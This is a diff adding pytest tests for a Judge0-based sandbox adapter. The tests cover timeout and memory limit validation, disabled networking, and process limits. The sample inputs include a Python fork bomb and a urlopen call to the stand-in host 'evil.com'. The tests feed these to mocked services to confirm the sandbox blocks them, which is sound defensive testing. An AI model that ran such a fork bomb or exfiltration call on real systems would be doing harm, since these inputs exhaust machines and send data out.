@@ -477,3 +477,175 @@ def test_execution_status_values() -> None:
     assert ExecutionStatus.TIME_LIMIT_EXCEEDED.value == "time_limit_exceeded"
     assert ExecutionStatus.MEMORY_LIMIT_EXCEEDED.value == "memory_limit_exceeded"
     assert ExecutionStatus.INTERNAL_ERROR.value == "internal_error"
+
+
+def test_run_request_validation_exact_and_capping() -> None:
+    # Exact limits (2000 ms, 128 MB)
+    req = RunRequest(language="python", source="x = 1", timeout_ms=2000, memory_mb=128)
+    assert req.timeout_ms == 2000
+    assert req.memory_mb == 128
+
+    # Capped when exceeding maximums (default strict_limits=False)
+    capped = RunRequest(language="python", source="x = 1", timeout_ms=10000, memory_mb=512)
+    assert capped.timeout_ms == 2000
+    assert capped.memory_mb == 128
+
+
+def test_run_request_validation_strict_rejection() -> None:
+    with pytest.raises(ValueError, match="timeout_ms exceeds maximum allowed limit"):
+        RunRequest(language="python", source="x = 1", timeout_ms=2500, strict_limits=True)
+
+    with pytest.raises(ValueError, match="memory_mb exceeds maximum allowed limit"):
+        RunRequest(language="python", source="x = 1", memory_mb=256, strict_limits=True)
+
+
+def test_run_request_validation_negative_zero_and_types() -> None:
+    # Zero and negative
+    with pytest.raises(ValueError, match="timeout_ms must be greater than 0"):
+        RunRequest(language="python", source="x = 1", timeout_ms=0)
+
+    with pytest.raises(ValueError, match="timeout_ms must be greater than 0"):
+        RunRequest(language="python", source="x = 1", timeout_ms=-500)
+
+    with pytest.raises(ValueError, match="memory_mb must be greater than 0"):
+        RunRequest(language="python", source="x = 1", memory_mb=0)
+
+    with pytest.raises(ValueError, match="memory_mb must be greater than 0"):
+        RunRequest(language="python", source="x = 1", memory_mb=-64)
+
+    # Invalid types
+    with pytest.raises(TypeError, match="timeout_ms must be an integer"):
+        RunRequest(language="python", source="x = 1", timeout_ms="2000")  # type: ignore[arg-type]
+
+    with pytest.raises(TypeError, match="timeout_ms must be an integer"):
+        RunRequest(language="python", source="x = 1", timeout_ms=True)  # type: ignore[arg-type]
+
+    with pytest.raises(TypeError, match="memory_mb must be an integer"):
+        RunRequest(language="python", source="x = 1", memory_mb=128.5)  # type: ignore[arg-type]
+
+    with pytest.raises(TypeError, match="memory_mb must be an integer"):
+        RunRequest(language="python", source="x = 1", memory_mb=False)  # type: ignore[arg-type]
+
+
+@pytest.mark.asyncio
+async def test_judge0_adapter_hardened_payload_inspection() -> None:
+    captured_payload = {}
+
+    async def handler(request: httpx.Request) -> httpx.Response:
+        import json
+
+        if "submissions" in str(request.url) and "submissions/" not in str(request.url):
+            captured_payload.update(json.loads(request.content.decode("utf-8")))
+            return httpx.Response(200, json=_make_submission_response("token-sec-123"))
+        return httpx.Response(200, json=_make_poll_response())
+
+    client = httpx.AsyncClient(transport=httpx.MockTransport(handler))
+    adapter = Judge0Adapter(
+        base_url="http://localhost:2358",
+        max_processes_and_or_threads=8,
+        client=client,
+        max_polls=2,
+    )
+
+    req = RunRequest(
+        language="python",
+        source="import socket; s = socket.socket()",
+        timeout_ms=1500,
+        memory_mb=64,
+    )
+    result = await adapter.run(req)
+
+    assert result.status is ExecutionStatus.ACCEPTED
+    assert captured_payload["enable_network"] is False
+    assert captured_payload["max_processes_and_or_threads"] == 8
+    assert captured_payload["cpu_time_limit"] == 1.5
+    assert captured_payload["wall_time_limit"] == 2.5
+    assert captured_payload["memory_limit"] == 64000
+    await client.aclose()
+
+
+@pytest.mark.asyncio
+async def test_judge0_adapter_limits_defense_in_depth_capping() -> None:
+    captured_payload = {}
+
+    async def handler(request: httpx.Request) -> httpx.Response:
+        import json
+
+        if "submissions" in str(request.url) and "submissions/" not in str(request.url):
+            captured_payload.update(json.loads(request.content.decode("utf-8")))
+            return httpx.Response(200, json=_make_submission_response("token-cap-123"))
+        return httpx.Response(200, json=_make_poll_response())
+
+    client = httpx.AsyncClient(transport=httpx.MockTransport(handler))
+    adapter = Judge0Adapter(base_url="http://localhost:2358", client=client, max_polls=2)
+
+    # Even if someone constructs a request bypassing capping, adapter enforces it
+    req = RunRequest(language="python", source="print(1)", timeout_ms=5000, memory_mb=512)
+    await adapter.run(req)
+
+    assert captured_payload["cpu_time_limit"] <= 2.0
+    assert captured_payload["memory_limit"] <= 128000
+    assert captured_payload["enable_network"] is False
+    assert captured_payload["max_processes_and_or_threads"] == 10
+    await client.aclose()
+
+
+@pytest.mark.asyncio
+async def test_judge0_adapter_simulated_fork_bomb() -> None:
+    # Fork bomb attempt: process limit reached leads to RuntimeError (Status 11/NZEC or 7)
+    responses = [
+        httpx.Response(200, json=_make_submission_response("token-fork-123")),
+        httpx.Response(
+            200,
+            json=_make_poll_response(
+                status_id=11,
+                stderr="BlockingIOError: [Errno 11] Resource temporarily unavailable",
+                exit_code=1,
+            ),
+        ),
+    ]
+    transport = MockTransport(responses)
+    client = httpx.AsyncClient(transport=transport)  # type: ignore[arg-type]
+
+    adapter = Judge0Adapter(base_url="http://localhost:2358", client=client, max_polls=2)
+    req = RunRequest(language="python", source="import os\nwhile True: os.fork()")
+    result = await adapter.run(req)
+
+    assert result.status is ExecutionStatus.RUNTIME_ERROR
+    assert "Resource temporarily unavailable" in result.stderr
+    assert result.exit_code == 1
+    await client.aclose()
+
+
+@pytest.mark.asyncio
+async def test_judge0_adapter_simulated_network_exfiltration_blocked() -> None:
+    # Network access blocked: network is unreachable
+    responses = [
+        httpx.Response(200, json=_make_submission_response("token-net-123")),
+        httpx.Response(
+            200,
+            json=_make_poll_response(
+                status_id=11,
+                stderr="urllib.error.URLError: <urlopen error [Errno 101] Network is unreachable>",
+                exit_code=1,
+            ),
+        ),
+    ]
+    transport = MockTransport(responses)
+    client = httpx.AsyncClient(transport=transport)  # type: ignore[arg-type]
+
+    adapter = Judge0Adapter(base_url="http://localhost:2358", client=client, max_polls=2)
+    req = RunRequest(
+        language="python",
+        source="import urllib.request\nurllib.request.urlopen('http://evil.com')",
+    )
+    result = await adapter.run(req)
+
+    assert result.status is ExecutionStatus.RUNTIME_ERROR
+    assert "Network is unreachable" in result.stderr
+    await client.aclose()
+
+
+def test_judge0_adapter_invalid_max_processes() -> None:
+    with pytest.raises(SandboxConfigurationError, match="max processes/threads must be at least 1"):
+        Judge0Adapter(base_url="http://localhost:2358", max_processes_and_or_threads=0)
